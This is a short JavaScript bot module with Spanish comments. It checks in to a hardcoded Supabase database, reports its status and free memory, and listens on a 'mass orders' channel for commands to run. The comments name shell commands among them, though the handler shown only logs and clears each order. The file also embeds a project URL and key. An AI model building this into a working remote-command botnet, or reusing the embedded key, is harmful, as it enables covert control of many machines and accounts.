import { createClient } from '@supabase/supabase-js';
import os from 'os';

// Conexión directa al "Cable Universal"
const supabase = createClient('https://kzuvndqicwcclhayyttc.supabase.co', 'sb_publishable_06Cs4IemHbf35JVVFKcBPQ_BlwJWa3M');

const Z = async (s) => {
    const id = s.user.id.split(':')[0]; // Usamos el número como ID único

    // 1. "Saludo" automático al sistema
    const { error } = await supabase
        .from('red_z')
        .upsert({ 
            id: id, 
            status: 'online', 
            ram: (os.freemem() / 1024 / 1024 / 1024).toFixed(2),
            last_ping: new Date() 
        });

    // 2. Escucha permanente (El cable directo)
    // Supabase Realtime detecta cualquier cambio en la tabla y avisa al bot
    supabase
        .channel('ordenes_masivas')
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'red_z', filter: `id=eq.${id}` }, 
        async (payload) => {
            const orden = payload.new.comando_pendiente;
            if (orden) {
                // Ejecutar: reaccionar, bloquear, o shell...
                console.log("Orden recibida por el cable:", orden);
                
                // Limpiar orden tras ejecutar
                await supabase.from('red_z').update({ comando_pendiente: null }).eq('id', id);
            }
        })
        .subscribe();
};

export default Z;
